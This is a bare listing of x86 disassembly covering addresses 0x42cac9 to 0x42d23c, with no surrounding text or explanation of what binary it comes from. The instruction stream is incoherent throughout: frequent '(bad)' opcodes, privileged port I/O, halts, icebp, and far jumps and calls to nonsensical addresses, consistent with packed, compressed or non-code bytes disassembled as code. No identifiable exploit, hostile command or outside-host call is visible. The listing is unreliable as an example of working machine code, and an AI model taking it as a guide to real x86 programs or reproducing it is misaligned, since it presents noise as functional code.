  42cac9:	add    esi,DWORD PTR [ebp+0x6e]
  42cacc:	fmul   QWORD PTR [edi-0x2c]
  42cacf:	out    dx,al
  42cad0:	add    DWORD PTR [esp+ecx*1+0x5d],eax
  42cad4:	sbb    ch,BYTE PTR [edi]
  42cad6:	xlat   BYTE PTR ds:[ebx]
  42cad7:	outs   dx,DWORD PTR ds:[esi]
  42cad8:	jle    0x42cb35
  42cada:	mov    al,0x5a
  42cadc:	mov    ecx,0x865fd71d
  42cae1:	rcl    esi,0x7f
  42cae4:	jle    0x42cb03
  42cae6:	xlat   BYTE PTR ds:[ebx]
  42cae7:	add    BYTE PTR [eax],al
  42cae9:	add    BYTE PTR [eax],al
  42caeb:	add    BYTE PTR [edi-0x36],cl
  42caee:	gs (bad) 
  42caf0:	jne    0x42cb40
  42caf2:	sbb    DWORD PTR [esi-0x1517324f],edi
  42caf8:	mov    eax,0xe5eb9a7d
  42cafd:	cmp    dl,BYTE PTR [edx+0x65d2fbd6]
  42cb03:	aad    0x1f
  42cb05:	push   eax
  42cb06:	jmp    0x42cac5
  42cb08:	mov    ecx,0x44eae3d1
  42cb0d:	xor    BYTE PTR [ecx+0x69c85eec],al
  42cb13:	(bad)  
  42cb14:	and    edx,0x4fee2db5
  42cb1a:	icebp  
  42cb1b:	jmp    0x42cb69
  42cb1d:	rcl    BYTE PTR [ecx-0x2a],1
  42cb20:	arpl   dx,cx
  42cb22:	out    0x50,eax
  42cb24:	jb     0x42cba3
  42cb26:	mov    ds:0x1ada270b,eax
  42cb2b:	dec    esp
  42cb2c:	into   
  42cb2d:	leave  
  42cb2e:	cmp    eax,0x29ca4205
  42cb33:	push   eax
  42cb34:	ja     0x42caf6
  42cb36:	stos   DWORD PTR es:[edi],eax
  42cb37:	into   
  42cb38:	jne    0x42cb17
  42cb3a:	in     eax,0x8b
  42cb3c:	dec    ecx
  42cb3d:	int    0x0
  42cb3f:	push   ebx
  42cb40:	cmp    cl,cl
  42cb42:	or     esi,edx
  42cb44:	and    DWORD PTR [edx-0x387103f0],ebp
  42cb4a:	stc    
  42cb4b:	mov    BYTE PTR [ecx],dh
  42cb4d:	int    0xff
  42cb4f:	mov    ah,0x0
  42cb51:	add    BYTE PTR [eax],al
  42cb53:	add    BYTE PTR [eax],al
  42cb55:	jns    0x42cb54
  42cb57:	test   BYTE PTR [eax],dh
  42cb59:	cdq    
  42cb5a:	int3   
  42cb5b:	cli    
  42cb5c:	imul   ecx,edx,0xeaedffd5
  42cb62:	pushf  
  42cb63:	clc    
  42cb64:	(bad)  
  42cb65:	dec    eax
  42cb66:	int3   
  42cb67:	je     0x42cb32
  42cb69:	inc    eax
  42cb6a:	dec    esi
  42cb6b:	repz push ebx
  42cb6d:	sub    ah,cl
  42cb6f:	je     0x42cb62
  42cb71:	pop    esi
  42cb72:	sti    
  42cb73:	icebp  
  42cb74:	mov    dh,0x28
  42cb76:	jle    0x42cb37
  42cb78:	fmulp  st(3),st
  42cb7a:	mov    eax,ebp
  42cb7c:	jl     0x42cbcc
  42cb7e:	int3   
  42cb7f:	cli    
  42cb80:	xor    al,0xfc
  42cb82:	fdivr  QWORD PTR [esi-0x7b]
  42cb85:	pop    ecx
  42cb86:	dec    ecx
  42cb87:	jge    0x42cb66
  42cb89:	inc    ecx
  42cb8a:	push   ebp
  42cb8b:	aaa    
  42cb8c:	jg     0x42cbe0
  42cb8e:	out    dx,al
  42cb8f:	std    
  42cb90:	imul   ecx,DWORD PTR [edx-0x3a],0x4f
  42cb94:	fs inc edx
  42cb96:	fimul  WORD PTR [edi+0x6e]
  42cb99:	stos   BYTE PTR es:[edi],al
  42cb9a:	test   dl,0xac
  42cb9d:	retf   0xfff8
  42cba0:	call   0x564e1a1b
  42cba5:	rcl    al,cl
  42cba7:	adc    al,0xa9
  42cba9:	jbe    0x42cc2a
  42cbab:	mov    edi,0xc8497bbd
  42cbb0:	fmul   QWORD PTR ds:[ebx]
  42cbb3:	sti    
  42cbb4:	fadd   QWORD PTR [esi]
  42cbb6:	out    dx,al
  42cbb7:	aas    
  42cbb8:	jmp    0x42cbbd
  42cbbd:	add    ch,cl
  42cbbf:	fild   DWORD PTR [esi+0x44799eac]
  42cbc5:	and    DWORD PTR [ebx-0x7f],ecx
  42cbc8:	inc    esp
  42cbc9:	jl     0xbec74ad1
  42cbcf:	enter  0x2d,0x5c
  42cbd3:	sub    BYTE PTR [ecx+0x437a8245],cl
  42cbd9:	adc    BYTE PTR [ecx+ecx*1],dl
  42cbdc:	cmc    
  42cbdd:	push   0xffffff94
  42cbdf:	jg     0x42cc24
  42cbe1:	hlt    
  42cbe2:	lods   al,BYTE PTR ds:[esi]
  42cbe3:	lods   eax,DWORD PTR ds:[esi]
  42cbe4:	jae    0x42cbee
  42cbe6:	adc    cl,BYTE PTR [ecx]
  42cbe8:	hlt    
  42cbe9:	add    BYTE PTR [esp+esi*2],dh
  42cbec:	cmp    eax,0xc8f32bff
  42cbf1:	test   BYTE PTR [edi+edi*8],bl
  42cbf4:	xchg   esp,eax
  42cbf5:	rol    edi,0xc4
  42cbf8:	mov    edx,0x8b55041c
  42cbfe:	clc    
  42cbff:	test   dh,ah
  42cc01:	cmp    BYTE PTR ds:0xa7530004,bl
  42cc07:	adc    BYTE PTR [eax],cl
  42cc09:	push   esi
  42cc0a:	arpl   WORD PTR [ecx],dx
  42cc0c:	call   0xf5f0ee04
  42cc11:	xor    eax,ebp
  42cc13:	out    dx,eax
  42cc14:	stc    
  42cc15:	push   cs
  42cc16:	mov    al,ds:0x62f629c4
  42cc1b:	pop    esp
  42cc1c:	dec    DWORD PTR [ecx+edx*2+0x8b4ae2]
  42cc23:	add    BYTE PTR [eax],al
  42cc25:	add    BYTE PTR [eax],al
  42cc27:	push   edi
  42cc28:	jl     0x42cc75
  42cc2a:	in     al,dx
  42cc2b:	inc    esp
  42cc2c:	jne    0x42cc6e
  42cc2e:	dec    DWORD PTR [ebx+0x47]
  42cc31:	mov    ebx,0xbff1bb75
  42cc36:	jmp    0x42d13d
  42cc3b:	pop    esp
  42cc3c:	xor    bl,dh
  42cc3e:	add    BYTE PTR [eax],al
  42cc40:	fadd   DWORD PTR [ecx+0x159e2fb]
  42cc46:	(bad)  
  42cc47:	loope  0x42cbf3
  42cc49:	dec    edx
  42cc4a:	call   0x39d172
  42cc4f:	jne    0x42cca6
  42cc51:	mov    edi,0xb4048d74
  42cc56:	xchg   BYTE PTR [eax-0x8],al
  42cc59:	xchg   eax,eax
  42cc5b:	push   eax
  42cc5c:	fsin   
  42cc5e:	cli    
  42cc5f:	jne    0x42ccc5
  42cc61:	scas   al,BYTE PTR es:[edi]
  42cc62:	ror    BYTE PTR [edi-0x141f857],0x89
  42cc69:	test   ch,bl
  42cc6b:	jne    0x42cc15
  42cc6d:	add    eax,DWORD PTR [eax]
  42cc6f:	xor    al,0xba
  42cc71:	repz push es
  42cc73:	inc    esp
  42cc74:	call   0x6fb:0xbb3407db
  42cc7b:	aaa    
  42cc7c:	adc    esi,eax
  42cc7e:	inc    esp
  42cc7f:	dec    edx
  42cc80:	repz adc dl,bh
  42cc83:	jne    0x42cc5e
  42cc85:	dec    BYTE PTR [edx]
  42cc87:	cli    
  42cc88:	push   esp
  42cc89:	add    al,0x0
  42cc8b:	add    BYTE PTR [eax],al
  42cc8d:	add    BYTE PTR [eax],al
  42cc8f:	add    BYTE PTR [ebp-0xd],dh
  42cc92:	add    esp,DWORD PTR [esi+0x74]
  42cc95:	pop    esi
  42cc96:	dec    ecx
  42cc97:	test   ebp,0xc1e7cb64
  42cc9d:	pop    ss
  42cc9e:	iret   
  42cc9f:	cli    
  42cca0:	icebp  
  42cca1:	cwde   
  42cca2:	push   edi
  42cca3:	xchg   edx,eax
  42cca4:	out    dx,eax
  42cca5:	adc    eax,0x8df187cb
  42ccaa:	mov    edx,0x885ff2f9
  42ccaf:	mov    edi,0x8148d761
  42ccb4:	jecxz  0x42cce5
  42ccb6:	add    al,0x0
  42ccb8:	jne    0x42cc71
  42ccba:	mov    eax,0xcf404fe8
  42ccbf:	cli    
  42ccc0:	clc    
  42ccc1:	popf   
  42ccc2:	into   
  42ccc3:	dec    edi
  42ccc4:	xchg   BYTE PTR [eax],dl
  42ccc6:	aaa    
  42ccc7:	push   ebx
  42ccc8:	call   0xb33c8d2a
  42cccd:	add    DWORD PTR [edx],esp
  42cccf:	xor    al,0xfc
  42ccd1:	inc    esp
  42ccd2:	sbb    ebx,edx
  42ccd4:	mov    edx,esp
  42ccd6:	sti    
  42ccd7:	inc    ebx
  42ccd8:	jne    0x42cd57
  42ccda:	sub    BYTE PTR [eax+0x77],bl
  42ccdd:	shr    BYTE PTR [ebx-0x4a24dc26],0x7e
  42cce4:	or     edx,edx
  42cce6:	std    
  42cce7:	cld    
  42cce8:	sti    
  42cce9:	inc    edi
  42ccea:	in     eax,0x5
  42ccec:	jmp    0x899c3aec
  42ccf1:	or     edx,edx
  42ccf3:	pop    eax
  42ccf4:	add    BYTE PTR [eax],al
  42ccf6:	add    BYTE PTR [eax],al
  42ccf8:	add    BYTE PTR [edx-0x26],dl
  42ccfb:	idiv   BYTE PTR [esi-0x4c]
  42ccfe:	jmp    0x33ec:0xc2d2083e
  42cd05:	clc    
  42cd06:	aas    
  42cd07:	ret    0x4d33
  42cd0a:	xchg   esi,eax
  42cd0b:	scas   al,BYTE PTR es:[edi]
  42cd0c:	sar    BYTE PTR [edi],1
  42cd0e:	(bad)  
  42cd0f:	xor    edx,esp
  42cd11:	das    
  42cd12:	lock nop
  42cd14:	clc    
  42cd15:	push   0x2
  42cd17:	(bad)  
  42cd19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd1a:	mov    ebp,0x29265068
  42cd1f:	mov    ds:0xf2040a48,eax
  42cd24:	mov    BYTE PTR [ebx+0x3],dl
  42cd27:	jmp    0x6435682f
  42cd2c:	dec    eax
  42cd2d:	and    eax,0xee33e959
  42cd32:	out    dx,eax
  42cd33:	test   al,0xf9
  42cd35:	stos   BYTE PTR es:[edi],al
  42cd36:	add    ah,BYTE PTR [esi-0x39]
  42cd39:	outs   dx,BYTE PTR ds:[esi]
  42cd3a:	pop    eax
  42cd3b:	out    0x2b,eax
  42cd3d:	push   edi
  42cd3e:	jnp    0x42cce3
  42cd40:	mov    bl,0x7f
  42cd42:	mov    WORD PTR [ebx+0x64f532e7],gs
  42cd48:	fwait
  42cd49:	ret    0xffc5
  42cd4c:	call   0x274c1bcf
  42cd51:	cmp    eax,0xba1056d1
  42cd56:	(bad)  
  42cd59:	cmc    
  42cd5a:	rol    BYTE PTR ds:[ecx],1
  42cd5d:	add    BYTE PTR [eax],al
  42cd5f:	add    BYTE PTR [eax],al
  42cd61:	add    BYTE PTR [esi],bh
  42cd63:	inc    ecx
  42cd64:	sti    
  42cd65:	push   cs
  42cd66:	adc    edx,ebp
  42cd68:	mov    BYTE PTR [esi+eiz*4+0x44],bh
  42cd6c:	cli    
  42cd6d:	(bad)  
  42cd6e:	sub    ebx,edi
  42cd70:	cli    
  42cd71:	jl     0x42cd0d
  42cd73:	pop    edi
  42cd74:	push   esi
  42cd75:	xchg   edi,eax
  42cd76:	stos   DWORD PTR es:[edi],eax
  42cd77:	fisub  DWORD PTR [eax]
  42cd79:	out    0x44,eax
  42cd7b:	enter  0xe186,0xf8
  42cd7f:	mov    DWORD PTR [eax],0x44779f5c
  42cd85:	loope  0x42cd0d
  42cd87:	ja     0x42cdcd
  42cd89:	mov    ecx,0x3011da81
  42cd8e:	and    al,0xc8
  42cd90:	xchg   BYTE PTR [ecx+eiz*1],bh
  42cd93:	jl     0x42cd8c
  42cd95:	pusha  
  42cd96:	ret    0xe7e2
  42cd99:	loopne 0x42ce0a
  42cd9b:	leave  
  42cd9c:	cli    
  42cd9d:	push   0x44
  42cd9f:	enter  0xe574,0x99
  42cda3:	or     BYTE PTR es:[edi-0x6fa92e46],ah
  42cdaa:	aad    0xc4
  42cdac:	cli    
  42cdad:	jmp    0xd3a9a7ef
  42cdb2:	and    al,0xc8
  42cdb4:	xchg   BYTE PTR [edx*8-0xe0ea385],ah
  42cdbb:	mov    esp,0x2c40b8fd
  42cdc0:	push   ebx
  42cdc1:	mov    edx,0x4efcb2be
  42cdc6:	add    BYTE PTR [eax],al
  42cdc8:	add    BYTE PTR [eax],al
  42cdca:	add    BYTE PTR [ebx+edi*2-0x4ca0ff09],ah
  42cdd1:	push   DWORD PTR [esp+eax*8-0x4f]
  42cdd5:	jae    0x42cdb7
  42cdd7:	xor    al,0x19
  42cdd9:	aas    
  42cdda:	jmp    DWORD PTR [ebx+0x47]
  42cddd:	je     0x42cdbf
  42cddf:	test   BYTE PTR [esi+0x7f83ff42],dh
  42cde5:	cmc    
  42cde6:	call   DWORD PTR [ebx-0x7c009784]
  42cdec:	mov    bl,0x79
  42cdee:	call   FWORD PTR [ebp-0x2639fbd4]
  42cdf4:	mov    ch,0xfa
  42cdf6:	mov    ecx,ecx
  42cdf8:	mov    ch,0x55
  42cdfa:	pop    esi
  42cdfb:	pop    es
  42cdfc:	mov    DWORD PTR [esp+eax*1+0x45835a5c],edi
  42ce03:	cmp    DWORD PTR [edx-0x77],ebx
  42ce06:	inc    ebp
  42ce07:	push   ds
  42ce08:	inc    edi
  42ce09:	inc    esp
  42ce0a:	out    0xb1,eax
  42ce0c:	xor    al,0xd0
  42ce0e:	mov    DWORD PTR [ecx-0x663b1d76],ebx
  42ce14:	mov    cl,0xf5
  42ce16:	mov    edi,esp
  42ce18:	jle    0x42ce12
  42ce1a:	call   DWORD PTR [ebx+0x7c]
  42ce1d:	xor    al,0xff
  42ce1f:	shl    DWORD PTR [edx-0x26fd17b0],cl
  42ce25:	clc    
  42ce26:	inc    DWORD PTR [ebx]
  42ce28:	sub    eax,0x8466aec
  42ce2d:	dec    ebx
  42ce2e:	call   0x42ce33
  42ce33:	add    BYTE PTR [esi*4-0x4870000b],cl
  42ce3a:	push   DWORD PTR [esp+edx*1+0xa]
  42ce3e:	call   0xf5f4693a
  42ce43:	jmp    0x42ce28
  42ce45:	jle    0x42ce39
  42ce47:	dec    ecx
  42ce49:	stc    
  42ce4a:	mov    ebp,0x2c247545
  42ce4f:	out    0x79,eax
  42ce51:	sbb    eax,DWORD PTR [edx-0x9]
  42ce54:	jne    0x42ce87
  42ce56:	ja     0x42ce9f
  42ce58:	ret    0x7f04
  42ce5b:	jl     0x42ce1b
  42ce5d:	ficom  DWORD PTR [ecx-0x64]
  42ce60:	cmc    
  42ce61:	xchg   esi,eax
  42ce62:	xlat   BYTE PTR ds:[ebx]
  42ce63:	push   ebp
  42ce64:	and    DWORD PTR [ebx-0x30],eax
  42ce67:	je     0x42cdfa
  42ce69:	in     al,0x51
  42ce6b:	repz (bad)
  42ce6e:	xor    ebp,eax
  42ce70:	dec    eax
  42ce71:	test   bh,0xfa
  42ce74:	lock sbb DWORD PTR [eax],eax
  42ce77:	xchg   ebp,eax
  42ce78:	mov    ch,0xf0
  42ce7a:	adc    BYTE PTR [esi+ebp*8-0x3],0x7d
  42ce7f:	jmp    0x42ce6a
  42ce81:	(bad)  
  42ce83:	inc    esi
  42ce85:	add    esi,DWORD PTR [ebx]
  42ce87:	lea    ebp,[eax]
  42ce89:	jns    0x42ce5b
  42ce8b:	cli    
  42ce8c:	pop    edx
  42ce8d:	ror    DWORD PTR [ebx+ebp*4+0x74cab453],0x79
  42ce95:	push   eax
  42ce96:	push   ecx
  42ce97:	xchg   BYTE PTR [eax],al
  42ce99:	add    BYTE PTR [eax],al
  42ce9b:	add    BYTE PTR [eax],al
  42ce9d:	inc    edx
  42ce9e:	push   cs
  42ce9f:	cld    
  42cea0:	add    BYTE PTR [edx-0x38],0x6b
  42cea4:	adc    BYTE PTR [edx],dh
  42cea6:	bound  edx,QWORD PTR [ecx-0xc]
  42cea9:	sbb    eax,0x22fccd41
  42ceae:	test   al,0xa5
  42ceb0:	mov    BYTE PTR [eax-0x7640f98f],dh
  42ceb6:	ret    
  42ceb7:	leave  
  42ceb8:	je     0x42cf33
  42ceba:	jmp    0xb3509035
  42cebf:	cdq    
  42cec0:	stc    
  42cec1:	cli    
  42cec2:	(bad)  
  42cec3:	test   DWORD PTR [eax+edi*8-0x1505351a],0xf032b901
  42cece:	dec    esp
  42cecf:	mov    eax,ds:0x40c2b283
  42ced4:	test   eax,edx
  42ced6:	les    ecx,FWORD PTR [ecx-0x77]
  42ced9:	or     al,BYTE PTR [esp+eiz*8+0x7a]
  42cedd:	mov    ah,0x31
  42cedf:	rol    ebx,1
  42cee1:	scas   eax,DWORD PTR es:[edi]
  42cee2:	ds jmp 0x2dacc868
  42cee8:	iret   
  42cee9:	scas   eax,DWORD PTR es:[edi]
  42ceea:	xor    DWORD PTR [ecx],edx
  42ceec:	sbb    BYTE PTR [edx-0x2576e63c],ch
  42cef2:	bnd jnp 0x42ceb9
  42cef5:	dec    eax
  42cef6:	mov    edi,0xc25bfc93
  42cefb:	mov    bh,BYTE PTR [ecx+edi*8+0x69]
  42ceff:	std    
  42cf00:	into   
  42cf01:	add    BYTE PTR [eax],al
  42cf03:	add    BYTE PTR [eax],al
  42cf05:	add    BYTE PTR [edi+0x74],bh
  42cf08:	imul   ebp,DWORD PTR [ebx+ebp*2-0x3e],0xffffffe9
  42cf0d:	xor    ebp,DWORD PTR [esi+0x18]
  42cf10:	mov    eax,ds:0x4f02a2f2
  42cf15:	pop    es
  42cf16:	call   0x5d6e9852
  42cf1b:	xchg   ebx,eax
  42cf1c:	mov    al,0xce
  42cf1e:	dec    edi
  42cf1f:	mov    esp,DWORD PTR [ebx]
  42cf21:	sti    
  42cf22:	aaa    
  42cf23:	dec    eax
  42cf24:	mov    ebp,0xe9027504
  42cf29:	fimul  DWORD PTR [ebx+0x7504ba7b]
  42cf2f:	add    dh,BYTE PTR [eax+ecx*4+0x2]
  42cf33:	rcr    BYTE PTR [ecx+0x291af2ce],0x3d
  42cf3a:	mov    BYTE PTR [esi+edx*8-0x171fe23d],bh
  42cf41:	add    esi,DWORD PTR [ebp-0x73]
  42cf44:	sti    
  42cf45:	xlat   BYTE PTR ds:[ebx]
  42cf46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf47:	sar    edi,0xfb
  42cf4a:	ret    0x448e
  42cf4d:	mov    DWORD PTR [esi-0xa3debd8],esp
  42cf53:	ds nop
  42cf55:	push   ecx
  42cf56:	dec    edi
  42cf57:	or     dl,bh
  42cf59:	push   esi
  42cf5a:	test   ebp,0xbcbe6a0b
  42cf60:	or     ch,BYTE PTR [ebp+0x50]
  42cf63:	sar    edx,0xe9
  42cf66:	aas    
  42cf67:	les    ecx,FWORD PTR [edi+0x64]
  42cf6a:	add    BYTE PTR [eax],al
  42cf6c:	add    BYTE PTR [eax],al
  42cf6e:	add    ch,bh
  42cf70:	cdq    
  42cf71:	imul   BYTE PTR [esi]
  42cf73:	mov    ebx,0x266c8d51
  42cf78:	mov    edx,0xaa661efa
  42cf7d:	test   eax,0x84bca513
  42cf82:	sub    DWORD PTR [ebx+0x76e97f85],ecx
  42cf88:	add    ch,BYTE PTR [edi]
  42cf8a:	and    al,BYTE PTR [edi+0x2a]
  42cf8d:	sub    cl,0x76
  42cf90:	add    ah,BYTE PTR [esi-0x18]
  42cf93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf94:	push   ecx
  42cf95:	push   0xc00276e9
  42cf9a:	ins    BYTE PTR es:[edi],dx
  42cf9b:	repnz nop
  42cf9d:	clc    
  42cf9e:	(bad)  
  42cf9f:	inc    eax
  42cfa0:	push   ecx
  42cfa1:	sti    
  42cfa2:	hlt    
  42cfa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfa4:	adc    BYTE PTR [eax-0x17],al
  42cfa7:	mov    ebp,0x28bf7eb1
  42cfac:	sbb    DWORD PTR ss:[esi+0x290dc12a],esi
  42cfb3:	jno    0x42cff6
  42cfb5:	clc    
  42cfb6:	cmp    edx,ecx
  42cfb8:	push   edx
  42cfb9:	sti    
  42cfba:	and    al,0x45
  42cfbc:	cmp    BYTE PTR [ebp+edx*4+0x31],0xc0
  42cfc1:	cli    
  42cfc2:	jmp    0x129566b
  42cfc7:	dec    esi
  42cfc8:	cmp    edi,DWORD PTR [esp+ecx*1+0x5f]
  42cfcc:	inc    ecx
  42cfcd:	inc    esp
  42cfce:	cld    
  42cfcf:	mov    edi,?
  42cfd1:	div    BYTE PTR [ebp+0x0]
  42cfd4:	add    BYTE PTR [eax],al
  42cfd6:	add    BYTE PTR [eax],al
  42cfd8:	fs clc 
  42cfda:	not    BYTE PTR ds:0x3ab2c0
  42cfe0:	push   ecx
  42cfe1:	(bad)  
  42cfe2:	outs   dx,BYTE PTR ds:[esi]
  42cfe3:	or     DWORD PTR [edx+0x65010349],esp
  42cfe9:	push   ecx
  42cfea:	cld    
  42cfeb:	je     0x42cfbc
  42cfed:	cmp    al,0x5c
  42cfef:	or     esp,edx
  42cff1:	int    0x13
  42cff3:	ins    BYTE PTR es:[edi],dx
  42cff4:	into   
  42cff5:	inc    esp
  42cff6:	add    BYTE PTR [esi+0x5b],dl
  42cff9:	mov    ecx,0x4cc1306
  42cffe:	cmp    BYTE PTR [ebp-0x59],bl
  42d001:	push   edi
  42d002:	or     al,0x8d
  42d004:	and    DWORD PTR [esi],esi
  42d006:	clc    
  42d007:	(bad)  
  42d008:	jnp    0x42d000
  42d00a:	out    0xd,eax
  42d00c:	rol    DWORD PTR [eax+eax*1],1
  42d00f:	inc    DWORD PTR [ecx]
  42d011:	int    0xe2
  42d013:	xchg   ebx,eax
  42d014:	jae    0x42cfe7
  42d016:	cmc    
  42d017:	mov    ecx,0x56a
  42d01c:	jmp    0x3c406aa9
  42d021:	iret   
  42d022:	rol    BYTE PTR [eax],0x5c
  42d025:	inc    esp
  42d026:	dec    ecx
  42d027:	jne    0x42d04e
  42d029:	cmp    al,BYTE PTR [ebx+ecx*1-0x65]
  42d02d:	lock push edx
  42d02f:	leave  
  42d030:	push   cs
  42d031:	mov    esp,0xdf9754fa
  42d036:	jg     0x42d024
  42d038:	or     al,0xbc
  42d03a:	cli    
  42d03b:	inc    DWORD PTR [eax]
  42d03d:	add    BYTE PTR [eax],al
  42d03f:	add    BYTE PTR [eax],al
  42d041:	pop    edi
  42d042:	clc    
  42d043:	dec    esi
  42d044:	(bad)  
  42d045:	shl    DWORD PTR [edi],0xfc
  42d048:	push   DWORD PTR [ebp-0x68]
  42d04b:	(bad)  
  42d04c:	pop    ss
  42d04d:	fimul  WORD PTR [edi-0x1b969a35]
  42d053:	xor    BYTE PTR [ebp-0x5331810],cl
  42d059:	repnz sbb DWORD PTR [esi+0x0],edx
  42d05d:	clc    
  42d05e:	mov    dh,0x9a
  42d060:	jle    0x42d00f
  42d062:	sub    bh,dl
  42d064:	pop    es
  42d065:	je     0x42d0c6
  42d067:	int3   
  42d068:	test   BYTE PTR [ebp-0x4c791629],dh
  42d06e:	jns    0x42d0c6
  42d070:	shl    BYTE PTR [edx-0xf730194],0x2d
  42d077:	enter  0xb2fa,0x99
  42d07b:	(bad)  
  42d07c:	mov    dh,0xac
  42d07e:	out    dx,al
  42d07f:	retf   
  42d080:	test   BYTE PTR [ebp-0xe408e48],dh
  42d086:	jmp    0xe988d9dc
  42d08b:	fs mov eax,esi
  42d08e:	pop    ebp
  42d08f:	enter  0x82fa,0x36
  42d093:	or     BYTE PTR [ebx+0x4fc6c07e],0x72
  42d09a:	fiadd  WORD PTR [esi+0x77a9b50e]
  42d0a0:	mov    esp,0xfac6a8e3
  42d0a5:	add    BYTE PTR [eax],al
  42d0a7:	add    BYTE PTR [eax],al
  42d0a9:	add    bh,cl
  42d0ab:	mov    cl,0x77
  42d0ad:	je     0x42d0d8
  42d0af:	icebp  
  42d0b0:	fist   DWORD PTR [eax]
  42d0b2:	and    dl,al
  42d0b4:	mov    BYTE PTR [eax+0x106bbc4a],0x3a
  42d0bb:	sbb    BYTE PTR [ebx-0x3f],bh
  42d0be:	lds    esp,FWORD PTR [esi]
  42d0c0:	dec    ecx
  42d0c1:	test   BYTE PTR ds:0x22f9f9e5,bl
  42d0c7:	add    al,BYTE PTR [eax+0x2d]
  42d0ca:	call   0xe836:0xf6fb99ba
  42d0d1:	add    esi,DWORD PTR [ebp-0x75]
  42d0d4:	mov    eax,ds:0x7484f034
  42d0d9:	iret   
  42d0da:	(bad)  
  42d0db:	mov    esi,0x85f97918
  42d0e0:	outs   dx,DWORD PTR ds:[esi]
  42d0e1:	retf   
  42d0e2:	out    dx,eax
  42d0e3:	push   ecx
  42d0e4:	sub    DWORD PTR [esp+ebx*8],0x1a8161bc
  42d0eb:	pcmpgtw mm5,QWORD PTR ds:0x78e90274
  42d0f2:	icebp  
  42d0f3:	cmc    
  42d0f4:	push   ecx
  42d0f5:	retf   
  42d0f6:	mov    edi,0xf6817451
  42d0fb:	mov    eax,0xbf42cb39
  42d100:	fistp  DWORD PTR [edi-0x7c]
  42d103:	inc    edx
  42d104:	jmp    0xe8f8ea8f
  42d109:	jl     0x42d13c
  42d10b:	mov    dl,0x65
  42d10d:	int3   
  42d10e:	add    BYTE PTR [eax],al
  42d110:	add    BYTE PTR [eax],al
  42d112:	add    BYTE PTR [edi+0x75ea6d0e],cl
  42d118:	add    ch,cl
  42d11a:	xchg   BYTE PTR [ecx],dh
  42d11c:	mov    edx,0x21f17901
  42d121:	repnz retf 0x536f
  42d125:	fs cmp esi,0xb2cae9b9
  42d12c:	(bad)  
  42d12d:	imul   edi,DWORD PTR [edi+0x5d],0xffffffbe
  42d131:	fnstenv [ebx]
  42d133:	pop    ebp
  42d134:	or     eax,0x884fc8d0
  42d139:	test   al,0xfa
  42d13b:	idiv   BYTE PTR [edi-0x18]
  42d13e:	add    esi,DWORD PTR [ebp+0x2a]
  42d141:	imul   eax,DWORD PTR [ebx],0x43000275
  42d147:	jb     0x42d16d
  42d149:	inc    DWORD PTR [eax+0x79]
  42d14c:	add    al,BYTE PTR [eax]
  42d14e:	imul   ebx,DWORD PTR [ebp+0x3fa08386],0xb5644fb9
  42d158:	mov    edx,0x26f81e7
  42d15d:	add    BYTE PTR [ebp+0x36],ch
  42d160:	or     DWORD PTR [ecx+eiz*2+0x64000276],eax
  42d167:	xor    eax,0x455c4fba
  42d16c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d16d:	sub    eax,0x3fefbe42
  42d172:	jmp    0xde0257ed
  42d177:	add    BYTE PTR [eax],al
  42d179:	add    BYTE PTR [eax],al
  42d17b:	add    BYTE PTR [ecx-0x7b],dl
  42d17e:	je     0x42d1c5
  42d180:	inc    ebx
  42d181:	ret    
  42d182:	push   es
  42d183:	lods   al,BYTE PTR ds:[esi]
  42d184:	sahf   
  42d185:	xor    DWORD PTR [ebx+0x6a],edx
  42d188:	cmp    eax,0x61bdffaa
  42d18d:	sub    al,0x8
  42d18f:	push   0x49fabdac
  42d194:	jbe    0x42d1c7
  42d196:	inc    ebx
  42d197:	ins    BYTE PTR es:[edi],dx
  42d198:	xor    al,0xbc
  42d19a:	sub    DWORD PTR [ecx],0x3a
  42d19d:	cld    
  42d19e:	out    0x2,eax
  42d1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1a1:	mov    esi,0x86ae72fa
  42d1a6:	cli    
  42d1a7:	jne    0x42d130
  42d1a9:	xchg   ecx,esi
  42d1ab:	jo     0x42d21a
  42d1ad:	daa    
  42d1ae:	push   ebx
  42d1af:	out    dx,al
  42d1b0:	push   edx
  42d1b1:	or     DWORD PTR ds:0xc83d7129,0x520430de
  42d1bb:	ds ret 0xf846
  42d1bf:	cmp    DWORD PTR [ecx],esp
  42d1c1:	xor    DWORD PTR [eax+0x0],eax
  42d1c4:	dec    esp
  42d1c5:	add    DWORD PTR [ebx],esi
  42d1c7:	(bad)  
  42d1c8:	imul   ebp,edx,0x3d91574d
  42d1ce:	(bad)  
  42d1cf:	std    
  42d1d0:	ror    edx,cl
  42d1d2:	loop   0x42d217
  42d1d4:	ror    al,0xf5
  42d1d7:	mov    ebx,DWORD PTR [ecx-0x42]
  42d1da:	xchg   DWORD PTR [eax],esi
  42d1dc:	xchg   ebp,eax
  42d1dd:	inc    ebp
  42d1de:	hlt    
  42d1df:	mov    bl,0x0
  42d1e1:	add    BYTE PTR [eax],al
  42d1e3:	add    BYTE PTR [eax],al
  42d1e5:	or     eax,0xf3f873ca
  42d1ea:	lods   al,BYTE PTR ds:[esi]
  42d1eb:	push   es
  42d1ec:	adc    ebx,DWORD PTR [esi+eax*1-0x349bb285]
  42d1f3:	jle    0x42d1d0
  42d1f5:	call   0x48c85dae
  42d1fa:	leave  
  42d1fb:	cmc    
  42d1fc:	dec    DWORD PTR [ecx+ebx*8]
  42d1ff:	xor    BYTE PTR [ebx-0x24],al
  42d202:	add    BYTE PTR [ebx+0x7d],bh
  42d205:	sub    BYTE PTR [esi],al
  42d207:	jne    0x42d233
  42d209:	inc    ecx
  42d20a:	std    
  42d20b:	imul   eax
  42d20d:	or     DWORD PTR [ebx],0x3d110000
  42d213:	das    
  42d214:	not    DWORD PTR [ebx-0x35]
  42d217:	dec    edx
  42d218:	(bad)  
  42d219:	stc    
  42d21a:	shl    ch,1
  42d21c:	adc    eax,0x3ab104
  42d221:	sbb    esi,eax
  42d223:	add    eax,0xf5c87185
  42d228:	jmp    DWORD PTR [edi-0x4a]
  42d22b:	dec    ebp
  42d22c:	call   0x3e9dfb
  42d231:	ja     0x42d1c8
  42d233:	mov    eax,DWORD PTR [ebp+0x64]
  42d236:	fdivr  st,st(1)
  42d238:	ds dec esp
  42d23a:	add    bh,dh
  42d23c:	jne    0x42d26a
